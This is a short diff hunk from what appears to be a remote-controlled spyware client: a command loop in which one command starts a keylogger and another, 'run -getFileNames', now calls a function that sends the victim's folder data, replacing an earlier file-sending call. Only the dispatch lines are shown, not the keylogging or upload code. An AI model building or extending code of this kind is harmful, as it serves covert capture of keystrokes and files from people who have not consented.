@@ -30,6 +30,6 @@ while True:
                             keylogger.start_keylogger(False)
                             print("Client Started the keylogger.")
                         case "run -getFileNames":
-                            userscanner.sendFiles()
+                            userscanner.sendFolderData()
                         
                         
